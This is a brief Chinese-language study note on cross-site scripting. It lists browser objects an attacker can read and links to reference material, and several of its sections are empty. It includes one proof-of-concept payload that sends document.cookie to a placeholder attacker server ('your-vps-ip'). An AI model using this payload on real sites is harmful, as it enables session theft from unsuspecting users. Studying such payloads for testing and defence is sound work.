# XSS

## 基本思路

xss的目的在于前端网页中注入恶意js代码，使得攻击者可以利用访问该网页用户的身份进行恶意操作

可以利用的敏感信息

```
document.cookie
document.location.href
top.location.href
window.opener.location.href
...
```

最简单的poc
```js
<script>window.open("http://your-vps-ip/"+document.cookie)</script>
```
window.open 可以替换为 window.location.href

## iframe


## 图片
### PNG

参考链接 https://xz.aliyun.com/t/7530

## CSP相关

## CheatSheet

Cross-site scripting (XSS) cheat sheet：

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet